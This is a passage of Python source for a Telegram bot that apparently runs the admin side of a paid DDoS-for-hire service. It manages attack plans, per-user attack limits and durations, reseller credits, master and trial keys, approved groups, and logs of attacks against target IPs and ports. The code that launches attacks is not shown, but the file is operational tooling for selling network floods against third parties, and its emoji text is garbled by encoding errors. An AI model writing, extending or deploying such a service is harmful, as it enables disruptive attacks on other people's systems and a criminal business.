            bot.reply_to(message, f"â User {uid} plan has been reset (deleted).")
        else:
            bot.reply_to(message, f"â No active plan found for {uid}.")
    except:
        bot.reply_to(message, "â Invalid user ID.")

@bot.message_handler(commands=['get_user_info'])
def get_user_info(message):
    if not is_admin_or_owner(message.from_user.id):
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "â ï¸ Usage: /get_user_info <user_id>")
        return
    try:
        uid = int(parts[1])
        plan = plans_col.find_one({"_id": str(uid)})
        if not plan:
            bot.reply_to(message, f"â No plan found for user {uid}.")
            return
        expires = datetime.fromisoformat(plan["expires"])
        remaining = expires - datetime.now()
        text = f"""ð¤ <b>User Info:</b> {uid}

ð¯ Attacks: {'Unlimited' if plan['attacks_left'] == -1 else plan['attacks_left']}
â±ï¸ Max Duration: {plan['max_duration']}s
â³ Cooldown: {plan['cooldown']}s
ð Expires: {expires.strftime('%Y-%m-%d %H:%M:%S')}
â° Time left: {remaining.days}d {remaining.seconds//3600}h
ð Redeemed code: {plan.get('redeemed_code', 'Unknown')}
"""
        bot.reply_to(message, text, parse_mode="HTML")
    except:
        bot.reply_to(message, "â Invalid user ID.")

@bot.message_handler(commands=['set_user_limit'])
def set_user_limit(message):
    if not is_admin_or_owner(message.from_user.id):
        return
    parts = message.text.split()
    if len(parts) != 4:
        bot.reply_to(message, "â ï¸ Usage: /set_user_limit <user_id> <max_time> <cooldown>")
        return
    try:
        uid = int(parts[1])
        max_time = int(parts[2])
        cooldown = int(parts[3])
        if max_time < 10 or max_time > 600 or cooldown < 0 or cooldown > 600:
            bot.reply_to(message, "â Max time 10-600s, cooldown 0-600s.")
            return
        plan = plans_col.find_one({"_id": str(uid)})
        if not plan:
            bot.reply_to(message, f"â No active plan for user {uid}.")
            return
        plans_col.update_one({"_id": str(uid)}, {"$set": {"max_duration": max_time, "cooldown": cooldown}})
        log_admin_action(message.from_user.id, "set_user_limit", f"user={uid}, max_time={max_time}, cooldown={cooldown}")
        bot.reply_to(message, f"â User {uid} limits updated: Max Time={max_time}s, Cooldown={cooldown}s")
    except:
        bot.reply_to(message, "â Invalid input.")

@bot.message_handler(commands=['reset_attack_limit'])
def reset_attack_limit(message):
    if not is_admin_or_owner(message.from_user.id):
        return
    parts = message.text.split()
    if len(parts) not in (1, 2):
        bot.reply_to(message, "â ï¸ Usage: /reset_attack_limit [user_id]   (omit user_id for all users)")
        return
    if len(parts) == 2:
        try:
            uid = int(parts[1])
            plan = plans_col.find_one({"_id": str(uid)})
            if not plan:
                bot.reply_to(message, f"â No plan for user {uid}.")
                return
            plans_col.update_one({"_id": str(uid)}, {"$set": {"attacks_left": -1}})
            log_admin_action(message.from_user.id, "reset_attack_limit", f"user={uid}")
            bot.reply_to(message, f"â Attack limit reset for user {uid} (now unlimited).")
        except:
            bot.reply_to(message, "â Invalid user ID.")
    else:
        result = plans_col.update_many({"expires": {"$gt": datetime.now().isoformat()}}, {"$set": {"attacks_left": -1}})
        log_admin_action(message.from_user.id, "reset_attack_limit", "all users")
        bot.reply_to(message, f"â Attack limit reset for {result.modified_count} active users (now unlimited).")

@bot.message_handler(commands=['backup_users'])
def backup_users(message):
    if not is_admin_or_owner(message.from_user.id):
        return
    users = list(plans_col.find({}, {"_id": 0}))
    filename = f"user_backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(filename, 'w') as f:
        json.dump(users, f, indent=2, default=str)
    with open(filename, 'rb') as f:
        bot.send_document(message.chat.id, f, visible_file_name=filename)
    os.remove(filename)
    log_admin_action(message.from_user.id, "backup_users", "exported user plans")
    bot.reply_to(message, "â User backup exported.")

# ------------------ Aliases for admin commands ------------------
@bot.message_handler(commands=['add_admin'])
def add_admin_alias(message):
    add_admin(message)

@bot.message_handler(commands=['remove_admin'])
def remove_admin_alias(message):
    remove_admin(message)

@bot.message_handler(commands=['list_admins'])
def list_admins_alias(message):
    list_admins(message)

# ------------------ Group Management ------------------
@bot.message_handler(commands=['approve'])
def approve_group(message):
    if not is_admin_or_owner(message.from_user.id):
        bot.reply_to(message, "â Owner or admin only.")
        return
    parts = message.text.split()
    if len(parts) == 5:
        try:
            gid = int(parts[1]); mc = int(parts[2]); mt = int(parts[3]); cd = int(parts[4])
            if mc < 1 or mc > 10 or mt < 10 or mt > 600 or cd < 0 or cd > 600:
                bot.reply_to(message, "â Invalid limits.")
                return
            groups_col.update_one({"_id": str(gid)}, {"$set": {"_id": str(gid)}}, upsert=True)
            limits_col.update_one({"_id": str(gid)}, {"$set": {"max_concurrent": mc, "max_time": mt, "cooldown": cd}}, upsert=True)
            log_admin_action(message.from_user.id, "approve_group", f"id={gid}")
            bot.reply_to(message, f"â Group {gid} approved with:\nMax Concurrent: {mc}\nMax Time: {mt}s\nCooldown: {cd}s")
        except:
            bot.reply_to(message, "â ï¸ Usage: /approve <id> <max_concurrent> <max_time> <cooldown>")
        return
    if is_group(message):
        chat_id = message.chat.id
        if not is_approved_group(chat_id):
            groups_col.insert_one({"_id": str(chat_id)})
            limits_col.update_one({"_id": str(chat_id)}, {"$set": {"max_concurrent": 1, "max_time": get_setting("max_attack_time", DEFAULT_MAX_ATTACK_TIME), "cooldown": get_setting("cooldown", DEFAULT_COOLDOWN)}}, upsert=True)
            log_admin_action(message.from_user.id, "approve_group", f"id={chat_id} (in-group)")
            bot.reply_to(message, f"â Group Approved!\nLimits: 1 concurrent, {get_setting('max_attack_time', DEFAULT_MAX_ATTACK_TIME)}s max time, {get_setting('cooldown', DEFAULT_COOLDOWN)}s cooldown")
        else:
            bot.reply_to(message, "â ï¸ Already approved.")
    else:
        bot.reply_to(message, "â ï¸ Use inside a group or with full parameters.")

@bot.message_handler(commands=['disapprove'])
def disapprove_group(message):
    if not is_admin_or_owner(message.from_user.id):
        return
    parts = message.text.split()
    if len(parts) == 2:
        try:
            gid = int(parts[1])
            groups_col.delete_one({"_id": str(gid)})
            limits_col.delete_one({"_id": str(gid)})
            log_admin_action(message.from_user.id, "disapprove_group", f"id={gid}")
            bot.reply_to(message, f"â Group {gid} Disapproved!")
        except:
            bot.reply_to(message, "â Invalid group ID!")
    elif is_group(message):
        chat_id = message.chat.id
        groups_col.delete_one({"_id": str(chat_id)})
        limits_col.delete_one({"_id": str(chat_id)})
        log_admin_action(message.from_user.id, "disapprove_group", f"id={chat_id} (in-group)")
        bot.reply_to(message, f"â Group Disapproved!\nð ID: {chat_id}")
    else:
        bot.reply_to(message, "â ï¸ Use inside a group or /disapprove <group_id>")

@bot.message_handler(commands=['approved_groups'])
def show_approved_groups(message):
    if not is_admin_or_owner(message.from_user.id):
        return
    groups = list(groups_col.find())
    if not groups:
        bot.reply_to(message, "ð No approved groups!")
        return
    text = "ð <b>Approved Groups:</b>\n\n"
    for i, g in enumerate(groups, 1):
        gid = g["_id"]
        limits = limits_col.find_one({"_id": gid})
        limit_str = ""
        if limits:
            limit_str = f" [Conc:{limits.get('max_concurrent',1)} Time:{limits['max_time']}s CD:{limits['cooldown']}s]"
        try:
            chat = bot.get_chat(int(gid))
            name = html.escape(chat.title or str(gid))
        except:
            name = "Unknown"
        text += f"{i}. {name} ({gid}){limit_str}\n"
    bot.reply_to(message, text, parse_mode="HTML")

# ------------------ User Management ------------------
@bot.message_handler(commands=['ban'])
def ban_user(message):
    if not is_admin_or_owner(message.from_user.id):
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "â ï¸ Usage: /ban <user_id>")
        return
    try:
        uid = int(parts[1])
        if uid == BOT_OWNER:
            bot.reply_to(message, "â Cannot ban the owner!")
            return
        bans_col.update_one({"_id": str(uid)}, {"$set": {"_id": str(uid)}}, upsert=True)
        log_admin_action(message.from_user.id, "ban_user", f"id={uid}")
        bot.reply_to(message, f"ð« User {uid} Banned!")
    except:
        bot.reply_to(message, "â Invalid user ID!")

@bot.message_handler(commands=['unban'])
def unban_user(message):
    if not is_admin_or_owner(message.from_user.id):
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "â ï¸ Usage: /unban <user_id>")
        return
    try:
        uid = int(parts[1])
        bans_col.delete_one({"_id": str(uid)})
        log_admin_action(message.from_user.id, "unban_user", f"id={uid}")
        bot.reply_to(message, f"â User {uid} Unbanned!")
    except:
        bot.reply_to(message, "â Invalid user ID!")

@bot.message_handler(commands=['banned_list'])
def banned_list(message):
    if not is_admin_or_owner(message.from_user.id):
        return
    banned = list(bans_col.find())
    if not banned:
        bot.reply_to(message, "ð No banned users!")
        return
    text = "ð« <b>Banned Users:</b>\n\n" + "\n".join(f"{i}. {b['_id']}" for i,b in enumerate(banned,1))
    bot.reply_to(message, text, parse_mode="HTML")

@bot.message_handler(commands=['list_banned'])
def list_banned_alias(message):
    banned_list(message)

@bot.message_handler(commands=['users'])
def list_users(message):
    if not is_admin_or_owner(message.from_user.id):
        return
    users = list(plans_col.find({"expires": {"$gt": datetime.now().isoformat()}}))
    if not users:
        bot.reply_to(message, "ð No active users.")
        return
    text = "ð¥ <b>Active Users:</b>\n\n"
    for u in users:
        uid = u["_id"]
        try:
            user = bot.get_chat(int(uid))
            name = f"@{user.username}" if user.username else html.escape(user.first_name or str(uid))
        except:
            name = str(uid)
        expires = datetime.fromisoformat(u["expires"])
        remaining = expires - datetime.now()
        text += f"â¢ {uid} â {name} â Expires in {remaining.days}d {remaining.seconds//3600}h\n"
    bot.reply_to(message, text[:4000], parse_mode="HTML")

@bot.message_handler(commands=['remove'])
def remove_user(message):
    if not is_admin_or_owner(message.from_user.id):
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "â ï¸ Usage: /remove <user_id>")
        return
    try:
        uid = int(parts[1])
        result = plans_col.delete_one({"_id": str(uid)})
        if result.deleted_count:
            bot.reply_to(message, f"â User {uid} removed (plan deleted).")
        else:
            bot.reply_to(message, "â User not found or no active plan.")
    except:
        bot.reply_to(message, "â Invalid user ID.")

@bot.message_handler(commands=['remove_expired'])
def remove_expired_users(message):
    if not is_admin_or_owner(message.from_user.id):
        return
    result = plans_col.delete_many({"expires": {"$lt": datetime.now().isoformat()}})
    bot.reply_to(message, f"â Removed {result.deleted_count} expired user plans.")

# ------------------ Reseller Management (admin only) ------------------
@bot.message_handler(commands=['add_reseller'])
def add_reseller(message):
    if not is_admin_or_owner(message.from_user.id):
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "â ï¸ Usage: /add_reseller <user_id>")
        return
    try:
        uid = int(parts[1])
        if is_reseller(uid):
            bot.reply_to(message, "â ï¸ Already a reseller.")
            return
        resellers_col.insert_one({"_id": str(uid), "credits": 0})
        log_admin_action(message.from_user.id, "add_reseller", f"id={uid}")
        bot.reply_to(message, f"â User {uid} added as reseller with 0 credits.")
    except:
        bot.reply_to(message, "â Invalid user ID!")

@bot.message_handler(commands=['remove_reseller'])
def remove_reseller(message):
    if not is_admin_or_owner(message.from_user.id):
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "â ï¸ Usage: /remove_reseller <user_id>")
        return
    try:
        uid = int(parts[1])
        resellers_col.delete_one({"_id": str(uid)})
        keys_col.delete_many({"created_by": uid})
        log_key_event("deleted (reseller removed)", "multiple", created_by=uid)
        log_admin_action(message.from_user.id, "remove_reseller", f"id={uid}")
        bot.reply_to(message, f"â User {uid} removed. Their keys deleted.")
    except:
        bot.reply_to(message, "â Invalid user ID!")

@bot.message_handler(commands=['resellers'])
def list_resellers(message):
    if not is_admin_or_owner(message.from_user.id):
        return
    resellers = list(resellers_col.find())
    if not resellers:
        bot.reply_to(message, "ð No resellers.")
        return
    text = "ð¥ <b>Resellers:</b>\n\n"
    for r in resellers:
        uid = r["_id"]
        credits = r.get("credits", 0)
        try:
            user = bot.get_chat(int(uid))
            username = f"@{user.username}" if user.username else "No username"
            name = html.escape(user.first_name or "")
        except:
            username = "Unknown"; name = ""
        text += f"â¢ {uid} | {username} | {name} | Credits: {credits}\n"
    bot.reply_to(message, text, parse_mode="HTML")

@bot.message_handler(commands=['addcredit'])
def add_credit(message):
    if not is_admin_or_owner(message.from_user.id):
        return
    parts = message.text.split()
    if len(parts) != 3:
        bot.reply_to(message, "â ï¸ Usage: /addcredit <user_id> <amount>")
        return
    try:
        uid = int(parts[1]); amt = int(parts[2])
        if not is_reseller(uid):
            bot.reply_to(message, "â Not a reseller.")
            return
        resellers_col.update_one({"_id": str(uid)}, {"$inc": {"credits": amt}})
        new_credits = resellers_col.find_one({"_id": str(uid)})["credits"]
        log_admin_action(message.from_user.id, "add_credit", f"reseller={uid}, amount={amt}")
        bot.reply_to(message, f"â Added {amt} credits to {uid}. New balance: {new_credits}")
    except:
        bot.reply_to(message, "â Invalid input.")

@bot.message_handler(commands=['removecredit'])
def remove_credit(message):
    if not is_admin_or_owner(message.from_user.id):
        return
    parts = message.text.split()
    if len(parts) != 3:
        bot.reply_to(message, "â ï¸ Usage: /removecredit <user_id> <amount>")
        return
    try:
        uid = int(parts[1]); amt = int(parts[2])
        if not is_reseller(uid):
            bot.reply_to(message, "â Not a reseller.")
            return
        reseller = resellers_col.find_one({"_id": str(uid)})
        current = reseller.get("credits", 0)
        new = max(0, current - amt)
        resellers_col.update_one({"_id": str(uid)}, {"$set": {"credits": new}})
        log_admin_action(message.from_user.id, "remove_credit", f"reseller={uid}, amount={amt}")
        bot.reply_to(message, f"â Removed {min(amt,current)} credits from {uid}. New balance: {new}")
    except:
        bot.reply_to(message, "â Invalid input.")

@bot.message_handler(commands=['reseller_credits'])
def reseller_credits(message):
    if not is_admin_or_owner(message.from_user.id):
        return
    resellers = list(resellers_col.find())
    if not resellers:
        bot.reply_to(message, "ð No resellers.")
        return
    text = "ð° <b>Reseller Credits:</b>\n\n" + "\n".join(f"â¢ {r['_id']}: {r.get('credits',0)} credits" for r in resellers)
    bot.reply_to(message, text, parse_mode="HTML")

@bot.message_handler(commands=['reseller_info'])
def reseller_info(message):
    if not is_admin_or_owner(message.from_user.id):
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "â ï¸ Usage: /reseller_info <id or @username>")
        return
    identifier = parts[1]
    target_id = None
    if identifier.isdigit():
        target_id = int(identifier)
    else:
        username = identifier.lstrip('@')
        for r in resellers_col.find():
            try:
                chat = bot.get_chat(int(r["_id"]))
                if chat.username and chat.username.lower() == username.lower():
                    target_id = int(r["_id"])
                    break
            except:
                pass
    if not target_id or not is_reseller(target_id):
        bot.reply_to(message, "â Reseller not found.")
        return
    reseller = resellers_col.find_one({"_id": str(target_id)})
    credits = reseller.get("credits", 0)
    total_keys = keys_col.count_documents({"created_by": target_id})
    active_keys = keys_col.count_documents({"created_by": target_id, "redeemed_by": None})
    redeemed_keys = keys_col.count_documents({"created_by": target_id, "redeemed_by": {"$ne": None}})
    try:
        chat = bot.get_chat(target_id)
        username = f"@{chat.username}" if chat.username else "No username"
        first_name = html.escape(chat.first_name or "")
    except:
        username = "Unknown"; first_name = ""
    text = f"""ð¤ <b>Reseller Info</b>

ð ID: {target_id}
ð Name: {first_name}
ð Username: {username}
ð° Credits: {credits}

ð <b>Key Statistics:</b>
â¢ Total Keys Generated: {total_keys}
â¢ Active (unredeemed) Keys: {active_keys}
â¢ Redeemed Keys: {redeemed_keys}"""
    bot.reply_to(message, text, parse_mode="HTML")

@bot.message_handler(commands=['list_reseller'])
def list_all_resellers(message):
    if not is_admin_or_owner(message.from_user.id):
        return
    resellers = list(resellers_col.find())
    if not resellers:
        bot.reply_to(message, "ð No resellers.")
        return
    text = "ð¥ <b>All Resellers:</b>\n\n"
    for r in resellers:
        uid = r["_id"]
        credits = r.get("credits", 0)
        try:
            user = bot.get_chat(int(uid))
            name = f"@{user.username}" if user.username else html.escape(user.first_name or str(uid))
        except:
            name = str(uid)
        text += f"â¢ {uid} â {name} â Credits: {credits}\n"
    bot.reply_to(message, text, parse_mode="HTML")

@bot.message_handler(commands=['set_reseller_expire'])
def set_reseller_expire(message):
    if not is_admin_or_owner(message.from_user.id):
        return
    parts = message.text.split()
    if len(parts) != 3:
        bot.reply_to(message, "â ï¸ Usage: /set_reseller_expire <reseller_id> <days>")
        return
    try:
        rid = int(parts[1])
        days = int(parts[2])
        if not is_reseller(rid):
            bot.reply_to(message, "â Not a reseller.")
            return
        count = keys_col.update_many({"created_by": rid, "redeemed_by": None}, {"$set": {"expires": (datetime.now() + timedelta(days=days)).isoformat()}})
        bot.reply_to(message, f"â Extended {count.modified_count} unredeemed keys for reseller {rid} by {days} days.")
    except:
        bot.reply_to(message, "â Invalid input.")

# ------------------ Key Generation (Admin/Owner) ------------------
@bot.message_handler(commands=['genkey'])
def genkey_owner(message):
    if not is_admin_or_owner(message.from_user.id):
        return
    parts = message.text.split()
    if len(parts) != 4:
        bot.reply_to(message, "â ï¸ Usage: /genkey <max_duration> <cooldown> <days>")
        return
    try:
        max_dur = int(parts[1]); cd = int(parts[2]); days = int(parts[3])
    except:
        bot.reply_to(message, "â Invalid numbers.")
        return
    code = generate_code("MASTER", 8)
    expires = datetime.now() + timedelta(days=days)
    keys_col.insert_one({"_id": code, "type": "master", "attacks_left": -1, "max_duration": max_dur, "cooldown": cd, "expires": expires.isoformat(), "created_by": message.from_user.id, "redeemed_by": None, "redeemed_at": None, "trial": False, "created_at": datetime.now().isoformat(), "duration_days": days})
    log_key_event("generated (master)", code, created_by=message.from_user.id, extra=f"max_dur={max_dur}, days={days}")
    code_length = len(code)
    bot.reply_to(message, f"â Master Key Generated!\nð Code: {code}\nð Length: {code_length} chars\nð¯ Attacks: Unlimited\nâ±ï¸ Max Duration: {max_dur}s\nâ³ Cooldown: {cd}s\nð Valid: {days} days")

@bot.message_handler(commands=['gentrial'])
def gentrial_owner(message):
    if not is_admin_or_owner(message.from_user.id):
        return
    parts = message.text.split()
    if len(parts) != 3:
        bot.reply_to(message, "â ï¸ Usage: /gentrial <hours> <count>")
        return
    try:
        hours = int(parts[1]); count = int(parts[2])
    except:
        bot.reply_to(message, "â Invalid numbers.")
        return
    codes = []
    expires = datetime.now() + timedelta(hours=hours)
    for _ in range(count):
        code = generate_code("TRIAL", 8)
        keys_col.insert_one({"_id": code, "type": "trial", "attacks_left": 1, "max_duration": get_setting("max_attack_time", DEFAULT_MAX_ATTACK_TIME), "cooldown": get_setting("cooldown", DEFAULT_COOLDOWN), "expires": expires.isoformat(), "created_by": message.from_user.id, "redeemed_by": None, "redeemed_at": None, "trial": True, "created_at": datetime.now().isoformat(), "duration_days": hours/24.0})
        codes.append(code)
        log_key_event("generated (trial)", code, created_by=message.from_user.id, extra=f"hours={hours}")
    code_list = "\n".join(codes)
    code_length = len(codes[0]) if codes else 0
    bot.reply_to(message, f"â Generated {count} trial keys valid {hours}h:\n{code_list}\nð Code length: {code_length} chars\nð¯ Attacks: 1 per key")

@bot.message_handler(commands=['gentrialfor'])
def gentrial_for_reseller(message):
    if not is_admin_or_owner(message.from_user.id):
        return
    parts = message.text.split()
    if len(parts) != 4:
        bot.reply_to(message, "â ï¸ Usage: /gentrialfor <reseller_id> <hours> <count>")
        return
    try:
        rid = int(parts[1]); hours = int(parts[2]); count = int(parts[3])
    except:
        bot.reply_to(message, "â Invalid parameters.")
        return
    if not is_reseller(rid):
        bot.reply_to(message, "â Not a reseller.")
        return
    codes = []
    expires = datetime.now() + timedelta(hours=hours)
    for _ in range(count):
        code = generate_code("TRIAL", 8)
        keys_col.insert_one({"_id": code, "type": "trial", "attacks_left": 1, "max_duration": get_setting("max_attack_time", DEFAULT_MAX_ATTACK_TIME), "cooldown": get_setting("cooldown", DEFAULT_COOLDOWN), "expires": expires.isoformat(), "created_by": message.from_user.id, "created_for": str(rid), "redeemed_by": None, "redeemed_at": None, "trial": True, "created_at": datetime.now().isoformat(), "duration_days": hours/24.0})
        codes.append(code)
        log_key_event("generated (trial for reseller)", code, created_by=message.from_user.id, extra=f"for={rid}, hours={hours}")
    code_list = "\n".join(codes)
    code_length = len(codes[0]) if codes else 0
    bot.reply_to(message, f"â Generated {count} trial keys for reseller {rid}:\n{code_list}\nð Code length: {code_length} chars\nð¯ Attacks: 1 per key")
    try:
        bot.send_message(rid, f"ð You received {count} trial keys ({hours}h):\n{code_list}")
    except:
        pass

@bot.message_handler(commands=['deletetrials'])
def delete_trials(message):
    if not is_admin_or_owner(message.from_user.id):
        return
    result = keys_col.delete_many({"trial": True, "redeemed_by": None})
    bot.reply_to(message, f"â Deleted {result.deleted_count} unredeemed trial keys.")

@bot.message_handler(commands=['deletealltrials'])
def delete_all_trials(message):
    if not is_admin_or_owner(message.from_user.id):
        return
    result = keys_col.delete_many({"trial": True})
    bot.reply_to(message, f"â Deleted all {result.deleted_count} trial keys.")

# ------------------ Admin Management (Owner only) ------------------
@bot.message_handler(commands=['addadmin'])
def add_admin(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "â Owner only command.")
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "â ï¸ Usage: /addadmin <user_id>")
        return
    try:
        uid = int(parts[1])
        if is_admin(uid):
            bot.reply_to(message, "â ï¸ Already admin.")
            return
        admins_col.insert_one({"_id": str(uid)})
        log_admin_action(message.from_user.id, "add_admin", f"Added admin {uid}")
        bot.reply_to(message, f"â User {uid} added as admin.")
    except:
        bot.reply_to(message, "â Invalid user ID!")

@bot.message_handler(commands=['removeadmin'])
def remove_admin(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "â Owner only command.")
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "â ï¸ Usage: /removeadmin <user_id>")
        return
    try:
        uid = int(parts[1])
        if not is_admin(uid):
            bot.reply_to(message, "â ï¸ Not an admin.")
            return
        admins_col.delete_one({"_id": str(uid)})
        log_admin_action(message.from_user.id, "remove_admin", f"Removed admin {uid}")
        bot.reply_to(message, f"â User {uid} removed from admins.")
    except:
        bot.reply_to(message, "â Invalid user ID!")

@bot.message_handler(commands=['admins'])
def list_admins(message):
    if not is_admin_or_owner(message.from_user.id):
        bot.reply_to(message, "â Owner or admin only.")
        return
    admins = list(admins_col.find())
    if not admins:
        bot.reply_to(message, "ð No admins.")
        return
    text = "ð¥ <b>Admins:</b>\n\n"
    for a in admins:
        uid = a["_id"]
        try:
            user = bot.get_chat(int(uid))
            username = f"@{user.username}" if user.username else "No username"
            name = html.escape(user.first_name or "")
        except:
            username = "Unknown"; name = ""
        text += f"â¢ {uid} | {username} | {name}\n"
    bot.reply_to(message, text, parse_mode="HTML")

@bot.message_handler(commands=['adminlogs'])
def admin_logs_command(message):
    if not is_admin_or_owner(message.from_user.id):
        return
    parts = message.text.split()
    n = 10
    if len(parts) == 2:
        try: n = int(parts[1])
        except: pass
    logs = list(admin_logs_col.find().sort("timestamp", -1).limit(n))
    if not logs:
        bot.reply_to(message, "ð No admin logs.")
        return
    text = f"ð <b>Last {len(logs)} Admin Actions:</b>\n\n"
    for log in reversed(logs):
        ts = datetime.fromisoformat(log["timestamp"]).strftime("%m-%d %H:%M")
        text += f"â¢ {ts} | Admin {log['admin_id']} | {log['action']}"
        if log.get("details"): text += f" | {log['details']}"
        text += "\n"
    bot.reply_to(message, text[:4000], parse_mode="HTML")

# ------------------ Owner Panel ------------------
@bot.message_handler(commands=['owner'])
def owner_panel(message):
    user_id = message.from_user.id
    if not is_admin_or_owner(user_id):
        return
    title = "ð OWNER PANEL" if is_owner(user_id) else "ð® ADMIN PANEL"
    text = f"""{title}

ð <b>Commands:</b>

ð¹ <b>Admin Management (Owner only):</b>
/addadmin <id> â /removeadmin <id> â /admins â /adminlogs [N]
Aliases: /add_admin, /remove_admin, /list_admins

ð¹ <b>Group Management:</b>
/approve (in group or with id limits) â /disapprove â /approved_groups

ð¹ <b>User Management:</b>
/ban <id> â /unban <id> â /banned_list â /list_banned â /users â /remove <user_id> â /remove_expired
/reset_user <id> â /get_user_info <id> â /set_user_limit <id> <max_time> <cooldown> â /reset_attack_limit [id]

ð¹ <b>Reseller System:</b>
/add_reseller <id> â /remove_reseller <id> â /resellers â /addcredit <id> <amt> â /removecredit â /reseller_credits â /reseller_info <id/username> â /list_reseller â /set_reseller_expire <id> <days>

ð¹ <b>Key Generation:</b>
/genkey <max_dur> <cooldown> <days> â Master key (unlimited)
/gentrial <hours> <count> â Trial keys
/gentrialfor <reseller_id> <hours> <count> â Trial for reseller
/deletetrials â Delete unredeemed trial keys
/deletealltrials â Delete ALL trial keys
/list_code â List all active codes
/delete_code <code> â Delete a specific code

ð¹ <b>Attack Monitoring:</b>
/view_reseller_attack <reseller_id> â View attacks by a reseller

ð¹ <b>Data Backup:</b>
/backup_users â Export all user plans as JSON

ð¹ <b>Redeem (any user):</b>
/redeem <code>

ð¹ <b>Smart Broadcast:</b>
/broadcast <target> <msg>  (all, private_users, resellers, authorized_groups)

ð¹ <b>Statistics & Logs:</b>
/state â /view_logs [N] â /server_stats â /view_code_logs [N] â /list_codes â /delete_code â /block_code â /key_state â /private_users â /deletelogs_attack â /deletelogs_key â /deletelogs_all â /export_data

ð¹ <b>Time Management:</b>
/extend_all_users <sec> â /deduct_all <sec> â /deduct_time <code> <sec>

ð¹ <b>Settings:</b>
/settime <sec> â /setcooldown <sec> â /setconcurrent <num> â /setapi <url> <key> â /port_protection on/off â /feedback on/off â /maintenance on/off â /block_port <ip> <port> â /unblock_port â /blocked_ports â /set_max_attack <seconds>"""
    bot.reply_to(message, text, parse_mode="HTML")

# ------------------ Attack Monitoring ------------------
@bot.message_handler(commands=['view_reseller_attack'])
def view_reseller_attack(message):
    if not is_admin_or_owner(message.from_user.id):
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "â ï¸ Usage: /view_reseller_attack <reseller_id>")
        return
    try:
        rid = int(parts[1])
        if not is_reseller(rid):
            bot.reply_to(message, "â Not a reseller.")
            return
        keys = list(keys_col.find({"created_by": rid}))
        redeemed_users = [k.get("redeemed_by") for k in keys if k.get("redeemed_by")]
        attacks = list(attack_logs_col.find({"user_id": {"$in": redeemed_users}}).sort("timestamp", -1).limit(50))
        if not attacks:
            bot.reply_to(message, f"ð No attacks found for reseller {rid}.")
            return
        text = f"ð <b>Last {len(attacks)} attacks by reseller {rid}'s users:</b>\n\n"
        for a in attacks:
            ts = datetime.fromisoformat(a["timestamp"]).strftime("%m-%d %H:%M")
            text += f"â¢ {ts} | User {a['user_id']} | {a['target']}:{a['port']} | {a['duration']}s | {a['status']}\n"
        bot.reply_to(message, text[:4000], parse_mode="HTML")
    except:
        bot.reply_to(message, "â Invalid reseller ID.")

# ------------------ Broadcast, Stats, Logs ------------------
@bot.message_handler(commands=['broadcast'])
def broadcast(message):
    if not is_admin_or_owner(message.from_user.id):
        return
    parts = message.text.split(maxsplit=2)
    if len(parts) < 3:
        bot.reply_to(message, "â ï¸ Usage: /broadcast <target> <msg>\nTargets: all, private_users, resellers, authorized_groups")
        return
    target = parts[1].lower()
    msg = html.escape(parts[2])
    count = 0
    photo = None
    if message.reply_to_message and message.reply_to_message.photo:
        photo = message.reply_to_message.photo[-1].file_id
    if target == "all":
        for u in known_users_col.find():
            try:
                if photo: bot.send_photo(int(u["_id"]), photo, caption=f"ð¢ Announcement:\n\n{msg}")
                else: bot.send_message(int(u["_id"]), f"ð¢ Announcement:\n\n{msg}")
                count += 1; time.sleep(0.5)
            except: pass
        for g in all_groups_col.find():
            try:
                if photo: bot.send_photo(int(g["_id"]), photo, caption=msg)
                else: bot.send_message(int(g["_id"]), msg)
                count += 1; time.sleep(0.5)
            except: pass
        bot.reply_to(message, f"â Broadcast sent to {count} recipients.")
    elif target == "private_users":
        for u in plans_col.find({"expires": {"$gt": datetime.now().isoformat()}}):
            try:
                if photo: bot.send_photo(int(u["_id"]), photo, caption=msg)
                else: bot.send_message(int(u["_id"]), msg)
                count += 1; time.sleep(0.5)
            except: pass
        bot.reply_to(message, f"â Broadcast sent to {count} private users.")
    elif target == "resellers":
        for r in resellers_col.find():
            try:
                if photo: bot.send_photo(int(r["_id"]), photo, caption=msg)
                else: bot.send_message(int(r["_id"]), msg)
                count += 1; time.sleep(0.5)
            except: pass
        bot.reply_to(message, f"â Broadcast sent to {count} resellers.")
    elif target == "authorized_groups":
        for g in groups_col.find():
            try:
                if photo: bot.send_photo(int(g["_id"]), photo, caption=msg)
                else: bot.send_message(int(g["_id"]), msg)
                count += 1; time.sleep(0.5)
            except: pass
        bot.reply_to(message, f"â Broadcast sent to {count} authorized groups.")
    else:
        bot.reply_to(message, "â ï¸ Invalid target.")

@bot.message_handler(commands=['state'])
def state_command(message):
    if not is_admin_or_owner(message.from_user.id):
        return
    text = f"""ð <b>Detailed Statistics</b>

â¢ Approved Groups: {groups_col.count_documents({})}
â¢ All Groups: {all_groups_col.count_documents({})}
â¢ Banned Users: {bans_col.count_documents({})}
â¢ Resellers: {resellers_col.count_documents({})}
â¢ Admins: {admins_col.count_documents({})}
â¢ Known Users: {known_users_col.count_documents({})}
â¢ Active Keys: {keys_col.count_documents({"redeemed_by": None, "expires": {"$gt": datetime.now().isoformat()}})}
â¢ Active Plans: {plans_col.count_documents({"expires": {"$gt": datetime.now().isoformat()}})}
â¢ Total Attacks: {attack_logs_col.count_documents({})}
â¢ Completed Attacks: {attack_logs_col.count_documents({"status": "completed"})}
â¢ Global Max Time: {get_setting('max_attack_time')}s
â¢ Global Cooldown: {get_setting('cooldown')}s
â¢ Max Concurrent: {get_setting('max_concurrent_attacks')}
â¢ Port Protection: {'ON' if get_setting('port_protection') else 'OFF'}
â¢ Feedback System: {'ON' if get_setting('feedback_system') else 'OFF'}
â¢ Maintenance: {'ON' if get_setting('maintenance_mode') else 'OFF'}"""
    bot.reply_to(message, text, parse_mode="HTML")

@bot.message_handler(commands=['view_logs'])
def view_logs(message):
